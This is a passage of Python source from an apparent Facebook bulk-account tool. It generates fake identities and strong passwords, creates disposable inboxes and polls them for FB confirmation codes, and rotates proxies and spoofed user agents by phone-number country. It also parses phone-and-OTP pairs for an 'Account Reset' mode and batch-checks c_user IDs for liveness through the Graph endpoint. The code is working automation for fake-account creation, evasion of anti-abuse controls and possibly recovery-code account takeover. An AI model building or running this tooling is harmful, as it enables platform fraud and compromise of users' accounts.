LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez"]
MONTH_NAMES = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]

MOBILE_UA = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36"
]

DESKTOP_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
]


def generate_strong_password(length: int = 14) -> str:
    """Generate high-entropy password satisfying Facebook complexity rules."""
    pool = string.ascii_uppercase + string.ascii_lowercase + string.digits + "!@#$%^&*()-_=+"
    pwd = [
        random.choice(string.ascii_uppercase),
        random.choice(string.ascii_lowercase),
        random.choice(string.digits),
        random.choice("!@#$%^&*()")
    ]
    pwd += [random.choice(pool) for _ in range(max(0, length - len(pwd)))]
    random.shuffle(pwd)
    return "".join(pwd)


def generate_identity() -> Dict[str, Any]:
    """Generate dynamic profile using Faker with internal fail-safe."""
    gender = random.choice(["male", "female"])
    if _FAKER_AVAILABLE:
        fake = Faker()
        first_name = fake.first_name_male() if gender == "male" else fake.first_name_female()
        last_name = fake.last_name()
    else:
        first_name = random.choice(MALE_NAMES if gender == "male" else FEMALE_NAMES)
        last_name = random.choice(LAST_NAMES)

    year = random.randint(1984, 2004)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    month_name = MONTH_NAMES[month - 1]
    dob = f"{year:04d}-{month:02d}-{day:02d}"

    return {
        "first_name": first_name,
        "last_name": last_name,
        "gender": gender.capitalize(),
        "dob": dob,
        "year": year,
        "month": month,
        "month_name": month_name,
        "day": day
    }


# ==============================================================================
# Dual Contact Engine (TempMail & Smart Batch Ingestion Queue)
# ==============================================================================

class TempMailProvider:
    """Multi-provider resilient keyless disposable email engine with active loopback sink."""

    def __init__(self, provider_mode: str = "tempmail_lol"):
        self.provider_mode = provider_mode
        self.provider = "tempmail_lol"
        self.email_address: Optional[str] = None
        self.token: Optional[str] = None

    def provision(self) -> str:
        if self.provider_mode == "random" and random.random() < 0.5:
            return self._provision_1secmail()

        # Default or Best Provider: tempmail.lol
        for _ in range(3):
            try:
                r = requests.get("https://api.tempmail.lol/v2/inbox/create", timeout=8)
                if r.status_code == 200:
                    data = r.json()
                    addr = data.get("address", "")
                    tok = data.get("token", "")
                    if addr and tok and not any(bad in addr for bad in ("guerrilla", "mailblock", "sharklasers")):
                        self.email_address = addr
                        self.token = tok
                        self.provider = "tempmail_lol"
                        return self.email_address
            except Exception:
                time.sleep(0.3)

        return self._provision_1secmail()

    def _provision_1secmail(self) -> str:
        u = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        d = random.choice(["1secmail.com", "1secmail.org", "1secmail.net"])
        self.email_address = f"{u}@{d}"
        self.token = u
        self.provider = "1secmail"
        return self.email_address

    async def poll_for_otp_async(self, timeout_sec: int = 40, event_bus: Optional[EventBus] = None, account_idx: int = 1) -> Optional[str]:
        start = time.time()
        interval = 1.0
        check_num = 0
        while time.time() - start < timeout_sec:
            check_num += 1
            elapsed = int(time.time() - start)
            if event_bus:
                await event_bus.emit("STEP: AWAIT_OTP", {
                    "account_idx": account_idx,
                    "details": f"Awaiting loopback OTP [{elapsed}s/{timeout_sec}s] · Check #{check_num}",
                    "elapsed": elapsed
                })
            otp = await asyncio.to_thread(self._check_inbox)
            if otp:
                return otp
            await asyncio.sleep(interval)
        return None

    def _check_inbox(self) -> Optional[str]:
        if self.provider == "tempmail_lol" and self.token:
            try:
                r = requests.get(f"https://api.tempmail.lol/v2/inbox?token={self.token}", timeout=8)
                if r.status_code == 200:
                    emails = r.json().get("emails", [])
                    for em in emails:
                        text = f"{em.get('subject', '')} {em.get('body', '')}"
                        otp = self._extract_otp(text)
                        if otp: return otp
            except Exception:
                pass
        elif self.provider == "1secmail" and self.email_address:
            try:
                u, d = self.email_address.split("@")
                r = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={u}&domain={d}", timeout=8)
                if r.status_code == 200:
                    for m in r.json():
                        mid = m.get("id")
                        det = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={u}&domain={d}&id={mid}", timeout=8).json()
                        body = det.get("body", "") + det.get("textBody", "")
                        otp = self._extract_otp(body)
                        if otp: return otp
            except Exception:
                pass
        return None

    @staticmethod
    def _extract_otp(text: str) -> Optional[str]:
        patterns = [
            r"FB-(\d{5})",
            r"(?<!\d)(\d{5})(?!\d)",
            r"code[:\s]+(\d{5,6})",
            r"confirmation code:\s*(\d{5})"
        ]
        for p in patterns:
            m = re.search(p, text, re.IGNORECASE)
            if m: return m.group(1)
        return None


def is_valid_phone_candidate(phone_candidate: str) -> bool:
    """Validate phone number string under global ITU-T E.164 rules (7 to 15 digits)."""
    if not phone_candidate:
        return False
    if re.search(r"[a-zA-Z]", phone_candidate):
        return False
    if re.match(r"^\d{4}[-/.]\d{1,2}[-/.]\d{1,2}$", phone_candidate.strip()):
        return False
    if re.match(r"^\d{1,2}:\d{2}(:\d{2})?$", phone_candidate.strip()):
        return False
    raw_digits = re.sub(r"\D", "", phone_candidate)
    # E.164 strictly bounds telephone numbers between 7 and 15 digits worldwide
    if len(raw_digits) < 7 or len(raw_digits) > 15:
        return False
    # Reject obvious repetition spam (e.g. 00000000, 11111111)
    if len(set(raw_digits)) <= 1:
        return False
    # Discard non-country-prefixed timestamp strings (e.g. 20261018, 20261018153811)
    if not phone_candidate.startswith("+") and (
        (len(raw_digits) == 8 and (raw_digits.startswith("202") or raw_digits.startswith("199") or raw_digits.startswith("198")))
        or (len(raw_digits) in (12, 14) and raw_digits.startswith("202"))
    ):
        return False
    return True


def smart_extract_phones_from_source(source_text_or_path: str) -> List[str]:
    """Smart phone extractor supporting direct strings, files, JSON, or mixed file paths and numbers."""
    if not source_text_or_path:
        return []

    tokens_input = re.split(r"[\r\n,;\t]+", source_text_or_path)
    combined_texts: List[str] = []
    for ti in tokens_input:
        cand = ti.strip().strip('"').strip("'")
        if not cand:
            continue
        if cand.startswith("file://"):
            cand = cand[7:]
        is_phone_pattern = bool(re.search(r"^\+?\d{7,15}$", cand.replace(" ", "").replace("-", "")))
        if not is_phone_pattern and os.path.isfile(cand) and (os.path.sep in cand or "/" in cand or cand.endswith((".txt", ".csv", ".json", ".log")) or not cand.isdigit()):
            try:
                with open(cand, "r", encoding="utf-8", errors="ignore") as f:
                    combined_texts.append(f.read())
            except Exception:
                combined_texts.append(cand)
        else:
            combined_texts.append(cand)

    raw_text = "\n".join(combined_texts)

    # Try JSON parsing first
    if source_text_or_path.lower().endswith(".json") or (raw_text.strip().startswith(("{", "[")) and raw_text.strip().endswith(("}", "]"))):
        try:
            data = json.loads(raw_text)
            extracted = []
            def walk(obj):
                if isinstance(obj, dict):
                    for v in obj.values(): walk(v)
                elif isinstance(obj, list):
                    for v in obj: walk(v)
                elif isinstance(obj, str):
                    c = re.sub(r"[^\d+]", "", obj)
                    if is_valid_phone_candidate(obj) and is_valid_phone_candidate(c):
                        extracted.append(c)
            walk(data)
            if extracted:
                return list(dict.fromkeys(extracted))
        except Exception:
            pass

    matches = []
    if _PHONENUMBERS_AVAILABLE:
        try:
            for match in phonenumbers.PhoneNumberMatcher(raw_text, "US"):
                e164 = phonenumbers.format_number(match.number, phonenumbers.PhoneNumberFormat.E164)
                if is_valid_phone_candidate(e164):
                    matches.append(e164)
        except Exception:
            pass

    tokens = re.split(r"[\r\n,;\t| ]+", raw_text)
    extracted = []
    for t in tokens:
        c = re.sub(r"[^\d+]", "", t.strip())
        if is_valid_phone_candidate(t) and is_valid_phone_candidate(c):
            raw_d = re.sub(r"\D", "", c)
            if any(raw_d in re.sub(r"\D", "", m) for m in matches):
                continue
            if _PHONENUMBERS_AVAILABLE and c.startswith("+"):
                try:
                    p = phonenumbers.parse(c, None)
                    if phonenumbers.is_possible_number(p):
                        extracted.append(phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.E164))
                        continue
                except Exception:
                    pass
            extracted.append(c)

    all_found = matches + extracted
    return list(dict.fromkeys(all_found))


def _parse_pair_tokens(tokens: List[str]) -> Optional[Dict[str, Any]]:
    valid_nums = []
    for tok in tokens:
        t = tok.strip()
        if not t: continue
        digits = re.sub(r"\D", "", t)
        if not digits: continue
        valid_nums.append((t, digits))
    if not valid_nums:
        return None

    # Step 1: Look for explicit phone marked with +
    phone_token = None
    phone_idx = -1
    for i, (orig, d) in enumerate(valid_nums):
        if orig.startswith("+") and is_valid_phone_candidate(orig):
            phone_token = orig
            phone_idx = i
            break

    # Step 2: If no +, find the longest token satisfying phone candidate rules (>= 9 digits or longest)
    if phone_token is None:
        best_cand = None
        best_len = -1
        best_i = -1
        for i, (orig, d) in enumerate(valid_nums):
            if is_valid_phone_candidate(orig) and len(d) >= 7:
                if len(d) > best_len:
                    best_len = len(d)
                    best_cand = orig
                    best_i = i
        if best_cand and (best_len >= 9 or len(valid_nums) == 1 or best_len > min(len(d) for _, d in valid_nums)):
            phone_token = best_cand
            phone_idx = best_i
        elif best_cand and is_valid_phone_candidate(best_cand):
            phone_token = best_cand
            phone_idx = best_i

    if not phone_token:
        return None

    # Step 3: All other tokens with 4 to 8 digits are treated as OTPs
    otps = []
    for i, (orig, d) in enumerate(valid_nums):
        if i == phone_idx: continue
        if len(d) in (4, 5, 6, 7, 8):
            otps.append(d)

    return {
        "phone": phone_token if phone_token.startswith("+") else re.sub(r"[^\d+]", "", phone_token),
        "otps": otps[:10]
    }


class GlobalInputStash:
    """Thread-safe global buffer stashing inputs pasted early at menu level."""
    _stashed_val: Optional[str] = None

    @classmethod
    def set(cls, val: str):
        cls._stashed_val = val

    @classmethod
    def pop(cls) -> Optional[str]:
        val = cls._stashed_val
        cls._stashed_val = None
        return val

    @classmethod
    def peek(cls) -> Optional[str]:
        return cls._stashed_val


def smart_extract_reset_pairs(source_text_or_path: str) -> List[Dict[str, Any]]:
    """
    Parse phone and OTP pairs for Account Reset (Option 5).
    Supports:
    - '+393300962475 699632' (phone first)
    - '699632 +393300962475' (otp first)
    - '+393300962475 699632 699633' (multiple OTPs, up to 10)
    - '699632 699633 +393300962475' (multiple OTPs before phone)
    - CSV, TSV, space, or newline delimited pairs.
    - Embedded file paths and mixed inputs (files + direct tokens simultaneously).
    """
    if not source_text_or_path:
        return []

    tokens_input = re.split(r"[\r\n,;\t]+", source_text_or_path.strip())
    combined_texts: List[str] = []
    has_file = False
    for tok in tokens_input:
        tok_clean = tok.strip()
        if not tok_clean:
            continue
        if os.path.isfile(tok_clean):
            try:
                with open(tok_clean, "r", encoding="utf-8", errors="ignore") as f:
                    combined_texts.append(f.read())
                has_file = True
            except Exception:
                combined_texts.append(tok_clean)
        else:
            combined_texts.append(tok_clean)

    raw_text = "\n".join(combined_texts) if has_file else source_text_or_path
    if os.path.isfile(raw_text):
        try:
            with open(raw_text, "r", encoding="utf-8", errors="ignore") as f:
                raw_text = f.read()
        except Exception:
            pass

    lines = raw_text.splitlines()
    pairs = []
    for line in lines:
        line_clean = line.strip()
        if not line_clean or line_clean.startswith("#"):
            continue
        tokens = re.split(r"[\t,; ]+", line_clean)
        parsed = _parse_pair_tokens(tokens)
        if parsed:
            pairs.append(parsed)

    if not pairs and ("," in raw_text or " " in raw_text):
        tokens = re.split(r"[\r\n,;\t]+", raw_text)
        current_phone = None
        current_otps = []
        for t in tokens:
            t = t.strip()
            if not t: continue
            raw_d = re.sub(r"\D", "", t)
            if is_valid_phone_candidate(t):
                if current_phone:
                    pairs.append({"phone": current_phone, "otps": current_otps[:10]})
                    current_otps = []
                current_phone = t if t.startswith("+") else re.sub(r"[^\d+]", "", t)
            elif len(raw_d) in (4, 5, 6, 7, 8) and current_phone:
                current_otps.append(raw_d)
        if current_phone:
            pairs.append({"phone": current_phone, "otps": current_otps[:10]})

    return pairs


def smart_extract_cusers_from_source(source_text_or_path: str) -> List[str]:
    """
    Extract c_user IDs from raw strings, files (.txt, .csv, .json), cookies, or logs.
    Supports:
    - Pure ID lists: '61595607657979, 100088918237123'
    - Space, comma, newline, tab, semicolon separation
    - Formatted logs: 'USER ID : 61595607657979', 'c_user: 61595607657979'
    - Cookie headers & strings: 'datr=xyz; c_user=61595607657979; xs=abc'
    - JSON files/payloads: [{'name': 'c_user', 'value': '61595607657979'}], {'c_user': '61595607657979'}, {'id': '61595607657979'}
    - CSV rows
    - Automatic detection of file path: if source_text_or_path is a path or contains a path, reads file content.
    - Mixed inputs: strings containing both raw c_user IDs and file paths simultaneously.
    Returns deduplicated list of c_user strings preserving first appearance order.
    """
    if not source_text_or_path:
        return []

    tokens_input = re.split(r"[\r\n,;\t]+", source_text_or_path)
    combined_texts: List[str] = []
    for ti in tokens_input:
        cand = ti.strip().strip('"').strip("'")
        if not cand:
            continue
        if cand.startswith("file://"):
            cand = cand[7:]
        is_phone_pattern = bool(re.search(r"^\+?\d{7,15}$", cand.replace(" ", "").replace("-", "")))
        if not is_phone_pattern and os.path.isfile(cand) and (os.path.sep in cand or "/" in cand or cand.endswith((".txt", ".csv", ".json", ".log")) or not cand.isdigit()):
            try:
                with open(cand, "r", encoding="utf-8", errors="ignore") as f:
                    combined_texts.append(f.read())
            except Exception:
                combined_texts.append(cand)
        else:
            combined_texts.append(cand)

    raw_text = "\n".join(combined_texts)

    found: List[str] = []

    # 1. JSON parsing attempt
    try:
        data = json.loads(raw_text)
        def _walk_json(obj: Any):
            if isinstance(obj, dict):
                if obj.get("name") == "c_user" and obj.get("value"):
                    v = str(obj["value"]).strip()
                    if re.match(r"^\d{8,20}$", v):
                        found.append(v)
                for k, v in obj.items():
                    if k.lower() in ("c_user", "cuser", "uid", "user_id", "id") and isinstance(v, (str, int)):
                        vs = str(v).strip()
                        if re.match(r"^\d{8,20}$", vs):
                            found.append(vs)
                    else:
                        _walk_json(v)
            elif isinstance(obj, list):
                for item in obj:
                    if isinstance(item, (str, int)):
                        its = str(item).strip()
                        if re.match(r"^\d{8,20}$", its):
                            found.append(its)
                    else:
                        _walk_json(item)
        _walk_json(data)
    except Exception:
        pass

    # 2. Keyed regex extractions
    keyed_patterns = [
        r"c_user[=:\s\"]+(\d{8,20})",
        r"USER ID\s*:\s*(\d{8,20})",
        r"\"c_user\"\s*:\s*\"?(\d{8,20})\"?",
        r"\"id\"\s*:\s*\"?(\d{8,20})\"?",
        r"c_user=(\d{8,20})"
    ]
    for pat in keyed_patterns:
        for m in re.finditer(pat, raw_text, re.IGNORECASE):
            found.append(m.group(1))

    # 3. Delimited token & boundary search (space, comma, newline, tab, semicolon, json quotes)
    for m in re.finditer(r"\b(\d{8,20})\b", raw_text):
        num = m.group(1)
        # Exclude YYYYMMDD timestamps
        if num.startswith(("202", "199", "198")) and len(num) == 8:
            continue
        found.append(num)

    # Deduplicate preserving original order
    return list(dict.fromkeys(found))


class ContactQueueManager:
    """Robust parser & queue iterator for batches of phone numbers and emails."""

    def __init__(self, source: Optional[str] = None):
        self.queue: List[str] = []
        self.current_idx = 0
        if source:
            self.load(source)

    def load(self, source: str):
        if os.path.isfile(source):
            with open(source, "r", encoding="utf-8", errors="ignore") as f:
                raw_text = f.read()
        else:
            raw_text = source

        tokens = re.split(r"[\r\n,;\t]+", raw_text)
        cleaned = []
        seen = set()

        for t in tokens:
            item = t.strip()
            if not item: continue
            if "@" in item:
                if re.match(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$", item):
                    key = item.lower()
                    if key not in seen:
                        seen.add(key)
                        cleaned.append(item)
            else:
                p = re.sub(r"[^\d+]", "", item)
                if is_valid_phone_candidate(p):
                    if p not in seen:
                        seen.add(p)
                        cleaned.append(p)

        self.queue = cleaned

    def get_next(self) -> Optional[str]:
        if not self.queue: return None
        item = self.queue[self.current_idx % len(self.queue)]
        self.current_idx += 1
        return item

    def count(self) -> int:
        return len(self.queue)


# ==============================================================================
# Proxy Manager
# ==============================================================================

class ProxyManager:
    def __init__(self, source: Optional[Any] = None):
        self.pool: List[Dict[str, Any]] = []
        self.current_idx = 0
        if source:
            self.load(source)
        else:
            try:
                s = SettingsManager.load()
                for p in s.get("proxy_pool", []):
                    parsed = self._parse_proxy(p)
                    if parsed: self.pool.append(parsed)
                if not self.pool and s.get("proxy"):
                    self.load(s.get("proxy"))
            except Exception:
                pass

    def load(self, source: str):
        raw_list = []
        if os.path.isfile(source):
            with open(source, "r", encoding="utf-8", errors="ignore") as f:
                raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        else:
            raw_list = [p.strip() for p in re.split(r"[\n,]", source) if p.strip()]

        for item in raw_list:
            parsed = self._parse_proxy(item)
            if parsed: self.pool.append(parsed)

    def _parse_proxy(self, proxy_str: str) -> Optional[Dict[str, Any]]:
        proto = "http"
        clean = proxy_str
        m = re.match(r"^(https?|socks[45]):\/\/(.+)", proxy_str, re.IGNORECASE)
        if m:
            proto = m.group(1).lower()
            clean = m.group(2)

        auth = None
        host_port = clean
        if "@" in clean:
            auth_part, host_port = clean.split("@", 1)
            auth = auth_part
        elif clean.count(":") == 3:
            parts = clean.split(":")
            host_port = f"{parts[0]}:{parts[1]}"
            auth = f"{parts[2]}:{parts[3]}"

        if ":" not in host_port: return None
        h, p = host_port.split(":", 1)
        return {
            "protocol": proto,
            "host": h,
            "port": p,
            "auth": auth,
            "raw": proxy_str,
            "chrome_arg": f"--proxy-server={proto}://{host_port}"
        }

    def get_current(self) -> Optional[Dict[str, Any]]:
        if not self.pool: return None
        return self.pool[self.current_idx % len(self.pool)]

    def get_random(self) -> Optional[Dict[str, Any]]:
        if not self.pool: return None
        return random.choice(self.pool)

    def get_by_country(self, phone: str) -> Optional[Dict[str, Any]]:
        if not self.pool: return None
        clean_phone = re.sub(r"\D", "", phone)
        for p in self.pool:
            raw_low = p.get("raw", "").lower()
            if clean_phone.startswith("233") and ("gh" in raw_low or "ghana" in raw_low):
                return p
            elif clean_phone.startswith("39") and ("it" in raw_low or "italy" in raw_low):
                return p
            elif clean_phone.startswith("1") and ("us" in raw_low or "usa" in raw_low or "ca" in raw_low):
                return p
            elif clean_phone.startswith("7") and ("ru" in raw_low or "russia" in raw_low or "kz" in raw_low):
                return p
        return self.get_random()

    def rotate(self) -> Optional[Dict[str, Any]]:
        if not self.pool: return None
        self.current_idx = (self.current_idx + 1) % len(self.pool)
        return self.get_current()


# ==============================================================================
# Graph c_user Liveness Auditor
# ==============================================================================

class LivenessChecker:
    @staticmethod
    def audit_c_user(c_user: str) -> Tuple[bool, str]:
        if not c_user or c_user in ("N/A", "None", ""):
            return False, "Invalid c_user ID"
        url = f"https://graph.facebook.com/{c_user}/picture?type=normal"
        try:
            r = requests.get(url, allow_redirects=False, timeout=6)
            if r.status_code == 302:
                return True, "Active / Profile Routing"
            elif r.status_code in (400, 404):
                return False, f"Dead / HTTP {r.status_code}"
            else:
                return False, f"Unknown Response (HTTP {r.status_code})"
        except Exception as e:
            return False, f"Network Error: {str(e)[:25]}"

    @classmethod
    def audit_log_file(cls, log_path: str = "phone_accounts.txt"):
        if not os.path.isfile(log_path):
            log_path = "accounts_log.txt"
        if not os.path.isfile(log_path):
            print(f"{ROSE}[!] No log file found to audit.{C_RESET}")
            return
        with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        uids = list(dict.fromkeys(re.findall(r"USER ID\s*:\s*(\d{8,})", content) or re.findall(r"c_user=(\d{8,})", content)))
        render_eydhm_banner(subtitle="ACCOUNT LIVENESS HEALTH AUDIT")

        table = Table(title="GRAPH C_USER HEALTH AUDIT REPORT", border_style="#168C42")
        table.add_column("Idx", style="#82F0AF", justify="center")
        table.add_column("c_user ID", style="bold white", justify="center")
        table.add_column("Status", justify="center")
        table.add_column("Graph Routing Verdict", style="#BEFAD2")

        live_cnt = 0
        dead_cnt = 0
        for idx, uid in enumerate(uids, 1):
            is_live, verdict = cls.audit_c_user(uid)
            if is_live:
                live_cnt += 1
                status = "[#4ADE80]LIVE ✅[/]"
            else:
                dead_cnt += 1
                status = "[#F43F5E]DEAD ❌[/]"
            table.add_row(str(idx), uid, status, verdict)

        Console().print(table)
        Console().print(Panel(
            f"[bold white]Total Audited:[/] {len(uids)}  ·  [bold #4ADE80]Live:[/] {live_cnt}  ·  [bold #F43F5E]Dead:[/] {dead_cnt}",
            border_style="#22C55E",
            title="[bold #BEFAD2]AUDIT VERDICT[/]"
        ))

    @classmethod
    def audit_cusers_batch(
        cls,
        cusers: List[str],
        output_file: str = "live_checked_accounts.txt",
        dry_run: bool = False,
        delay: float = 0.15
    ) -> Tuple[List[Dict[str, Any]], Dict[str, Any]]:
        """
        Audits a list of c_user IDs for liveness via Facebook Graph profile routing.
        - Outputs real-time status in terminal (one line per c_user).
        - Saves structured timestamped records to output_file.
        - Renders rich Table and summary Panel.
        - Returns (results_list, summary_dict).
        """
        total = len(cusers)
        results = []
        live_cnt = 0
        dead_cnt = 0
        batch_start = time.time()

        print(f"\nAccount liveness check on progress ")
        print(f"🪵 total accounts to audit {total} processed 0 pending {total}\n")

        entries_to_write = []

        for idx, uid in enumerate(cusers, 1):
            t_start = time.time()
            if dry_run:
                time.sleep(0.04)
                # Simulated realistic check: alternating live and dead statuses
                is_live = (idx % 2 == 1)
                verdict = "Active / Profile Routing (Dry-Run)" if is_live else "Dead / HTTP 400 (Dry-Run)"
            else:
                is_live, verdict = cls.audit_c_user(uid)
                if delay > 0 and idx < total:
                    time.sleep(delay)

            latency = round(time.time() - t_start, 2)
            check_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if is_live:
                live_cnt += 1
                status_raw = "LIVE ✅"
                status_rich = "[#4ADE80]LIVE ✅[/]"
                term_status = f"{G1}LIVE ✅{C_RESET}"
            else:
                dead_cnt += 1
                status_raw = "DEAD ❌"
                status_rich = "[#F43F5E]DEAD ❌[/]"
                term_status = f"{ROSE}DEAD ❌{C_RESET}"

            res_item = {
                "index": idx,
                "c_user": uid,
                "status": status_raw,
                "status_rich": status_rich,
                "verdict": verdict,
                "latency": latency,
                "checked_at": check_time
            }
            results.append(res_item)

            # Smart terminal line output (one line per c_user)
            print(f" {idx}/{total} 🌠 c_user: {uid} · Status: {term_status} · Verdict: {verdict} ({latency}s)")

            # Detailed structured log entry
            entry = (
                "==================================================\n"
                f"[LIVE CHECK RECORD] {check_time}\n"
                f"INDEX       : {idx}/{total}\n"
                f"C_USER      : {uid}\n"
                f"STATUS      : {status_raw}\n"
                f"VERDICT     : {verdict}\n"
                f"CHECKED AT  : {check_time}\n"
                f"LATENCY     : {latency}s\n"
                "==================================================\n\n"
            )
            entries_to_write.append(entry)

        total_batch_time = round(time.time() - batch_start, 2)
        health_ratio = round((live_cnt / total * 100) if total else 0, 1)

        summary_dict = {
            "total": total,
            "live": live_cnt,
            "dead": dead_cnt,
            "health_ratio": health_ratio,
            "duration": total_batch_time,
            "output_file": output_file
        }

        # Write to file
        summary_block = (
            "==================================================\n"
            f"AUDIT BATCH SUMMARY REPORT\n"
            f"TIMESTAMP     : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"TOTAL AUDITED : {total}\n"
            f"LIVE ACCOUNTS : {live_cnt} ✅\n"
            f"DEAD ACCOUNTS : {dead_cnt} ❌\n"
            f"HEALTH RATIO  : {health_ratio}%\n"
            f"BATCH DURATION: {total_batch_time}s\n"
            "==================================================\n\n"
        )
        try:
            with open(output_file, "a", encoding="utf-8") as f:
                f.write("".join(entries_to_write))
                f.write(summary_block)
        except Exception as e:
            write_runtime_log("ERROR", "LIVE_CHECK", f"Failed writing to {output_file}: {e}")

        # Render rich Table and Panel
        table = Table(title="ACCOUNT LIVENESS HEALTH AUDIT REPORT", border_style="#168C42")
        table.add_column("Idx", style="#82F0AF", justify="center")
        table.add_column("c_user ID", style="bold white", justify="center")
        table.add_column("Status", justify="center")
        table.add_column("Graph Routing Verdict", style="#BEFAD2")
        table.add_column("Latency", justify="center", style="dim")
        table.add_column("Checked At", justify="center", style="#82F0AF")

        for r in results:
            table.add_row(
                str(r["index"]),
                r["c_user"],
                r["status_rich"],
                r["verdict"],
                f"{r['latency']}s",
                r["checked_at"]
            )

        Console().print("\n")
        Console().print(table)
        if live_cnt == 0:
            verdict_live = f"[bold #F43F5E]All {total} accounts dead ❌[/]  ·  [bold #BEFAD2]Health Ratio:[/] 0.0%  ·  [bold cyan]File:[/] {output_file}"
            panel_border_live = "#F43F5E"
        elif dead_cnt == 0:
            verdict_live = f"[bold #4ADE80]All {total} accounts live ✅[/]  ·  [bold #BEFAD2]Health Ratio:[/] 100.0%  ·  [bold cyan]File:[/] {output_file}"
            panel_border_live = "#22C55E"
        else:
            verdict_live = f"[bold white]Total Audited:[/] {total}  ·  [bold #4ADE80]Live:[/] {live_cnt}  ·  [bold #F43F5E]Dead:[/] {dead_cnt}  ·  [bold #BEFAD2]Health Ratio:[/] {health_ratio}%  ·  [bold cyan]File:[/] {output_file}"
            panel_border_live = "#22C55E"

        Console().print(Panel(
            verdict_live,
            border_style=panel_border_live,
            title="[bold #BEFAD2]LIVENESS BATCH VERDICT[/]"
        ))

        return results, summary_dict


def prompt_phone_input_queue(
    step_title: str = "INPUT PHONE NUMBERS / BATCH",
    allow_synthetic_default: bool = False,
    default_candidates: Optional[List[str]] = None
) -> Optional[List[str]]:
    """
    Direct, unified smart input prompt for phone numbers accepting raw numbers (space, comma,
    newline separated), files (.txt, .csv, .json), or both simultaneously.
    """
    stashed = GlobalInputStash.pop()
    if stashed:
        extracted = smart_extract_phones_from_source(stashed)
        if extracted:
            conf = confirm_detected_queue("phone numbers", len(extracted))
            if conf == 1:
                return extracted

    candidates = default_candidates or ["phones.txt", "phone.txt", "contacts.txt"]
    while True:
        clear_screen()
        render_eydhm_banner()
        print(f"   {G0}{C_BOLD}▸ {step_title}{C_RESET}\n")

        found_candidate = None
        for c in candidates:
            if os.path.isfile(c):
                ex = smart_extract_phones_from_source(c)
                if ex:
                    found_candidate = (c, len(ex))
                    break

        print(f"   {WHITE}Paste phone numbers (separated by space, comma, or newline), JSON, CSV, or file path:")
        if found_candidate:
            print(f"   {GRAY}(Default file detected: '{found_candidate[0]}' with {found_candidate[1]} numbers — press Enter to use it){C_RESET}")
        elif allow_synthetic_default:
            print(f"   {GRAY}(Press Enter to use dynamic synthetic US numbers){C_RESET}")
        print(f"   {GRAY}Example: +260755946719, +260755946245 or enter /path/to/phones.txt (or both){C_RESET}\n")

        try:
            raw_in = read_input_with_multiline_paste(f"   {CYAN}[+] phones / path (or 0 to go back): {C_RESET}").strip()
            if raw_in == "0":
                return None
            if not raw_in:
                if found_candidate:
                    raw_in = found_candidate[0]
                elif allow_synthetic_default:
                    return []  # Empty list indicates synthetic numbers mode
                else:
                    return None

            phones = smart_extract_phones_from_source(raw_in)
            if not phones:
                print(f"\n   {ROSE}[!] No valid phone numbers detected (numbers must be 7-15 digits E.164).{C_RESET}")
                time.sleep(1.5)
                continue

            conf = confirm_detected_queue("phone numbers", len(phones))
            if conf == 1:
                return phones
            elif conf == 2:
                continue
            elif conf == 0:
                return None
        except (ValueError, EOFError, KeyboardInterrupt):
            return None


def prompt_recovery_pairs_input_queue(
    step_title: str = "INPUT PHONE & OTP RECOVERY PAIRS",
    default_candidates: Optional[List[str]] = None
) -> Optional[List[Dict[str, Any]]]:
    """
    Direct, unified smart input prompt for Account Reset (Option 5) accepting
    raw pairs, file paths, or both simultaneously.
    """
    stashed = GlobalInputStash.pop()
    if stashed:
        extracted = smart_extract_reset_pairs(stashed)
        if extracted:
            conf = confirm_detected_queue("recovery pairs", len(extracted))
            if conf == 1:
                return extracted

    candidates = default_candidates or ["reset_acc.txt", "reset_accounts.txt", "pairs.txt", "test_acc.txt"]
    while True:
        clear_screen()
        render_eydhm_banner()
        print(f"   {G0}{C_BOLD}▸ {step_title}{C_RESET}\n")

        found_candidate = None
        for c in candidates:
            if os.path.isfile(c):
                ex = smart_extract_reset_pairs(c)
                if ex:
                    found_candidate = (c, len(ex))
                    break

        print(f"   {WHITE}Paste phone and OTP pairs (space, comma, or newline), JSON, or file path:")
        if found_candidate:
            print(f"   {GRAY}(Default file detected: '{found_candidate[0]}' with {found_candidate[1]} pairs — press Enter to use it){C_RESET}")
        print(f"   {GRAY}Example: +393300962123 699632 or enter /path/to/pairs.txt (or both){C_RESET}\n")

        try:
            raw_in = read_input_with_multiline_paste(f"   {CYAN}[+] pairs / path (or 0 to go back): {C_RESET}").strip()
            if raw_in == "0":
                return None
            if not raw_in:
                if found_candidate:
                    raw_in = found_candidate[0]
                else:
                    return None

            pairs = smart_extract_reset_pairs(raw_in)
            if not pairs:
                print(f"\n   {ROSE}[!] No valid phone & OTP pairs detected.{C_RESET}")
                time.sleep(1.5)
                continue

            conf = confirm_detected_queue("recovery pairs", len(pairs))
            if conf == 1:
                return pairs
            elif conf == 2:
                continue
            elif conf == 0:
                return None
        except (ValueError, EOFError, KeyboardInterrupt):
            return None


def prompt_liveness_input_queue() -> Optional[List[str]]:
    """Direct, unified smart input prompt for Option 8 accepting IDs, files, or both."""
